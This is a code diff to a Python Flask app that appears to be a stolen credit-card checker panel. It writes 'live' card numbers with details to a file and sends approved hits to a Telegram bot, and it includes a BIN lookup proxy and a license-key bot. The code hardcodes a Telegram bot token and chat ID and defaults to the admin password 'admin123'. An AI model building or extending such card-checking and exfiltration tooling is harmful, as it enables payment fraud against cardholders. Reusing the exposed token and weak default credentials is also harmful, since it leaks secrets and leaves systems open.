@@ -30,7 +30,6 @@ CONFIG_FILE = 'config.json'
 LIVE_FILE = 'live.txt'
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
 
-# Default License Generator Bot Token & Chat ID
 DEFAULT_TG_TOKEN = "9138065167:AAHG3HmeQ8a_v7jiuUVqECR-m2W7Xc14fqg"
 DEFAULT_TG_CHAT = "6516330870"
 
@@ -88,7 +87,7 @@ def save_live_card(card_line, detail):
         with open(LIVE_FILE, "a", encoding="utf-8") as f:
             f.write(f"{card_line} | {detail}\n")
         
-        # Magpadala LAMANG sa Live Cards Telegram Bot (Hiwalay sa Keys bot)
+        # Send Live/Approved hits to the Telegram config specified in checker panel
         cfg = load_config()
         live_token = cfg.get("live_tg_token", "").strip()
         live_chat = cfg.get("live_tg_chat", "").strip()
@@ -141,14 +140,11 @@ def handle_config():
     elif request.method == 'POST':
         data = request.get_json() or {}
         cfg = load_config()
-        cfg["key_tg_token"] = data.get("key_tg_token", DEFAULT_TG_TOKEN).strip()
-        cfg["key_tg_chat"] = data.get("key_tg_chat", DEFAULT_TG_CHAT).strip()
         cfg["live_tg_token"] = data.get("live_tg_token", "").strip()
         cfg["live_tg_chat"] = data.get("live_tg_chat", "").strip()
         save_config(cfg)
         return jsonify({"success": True})
 
-# Server-side BIN Proxy to prevent browser CORS block and ensure accurate lookup
 @app.route('/api/bin/<bin_code>')
 def api_bin_lookup(bin_code):
     bin_code = bin_code.strip()[:6]
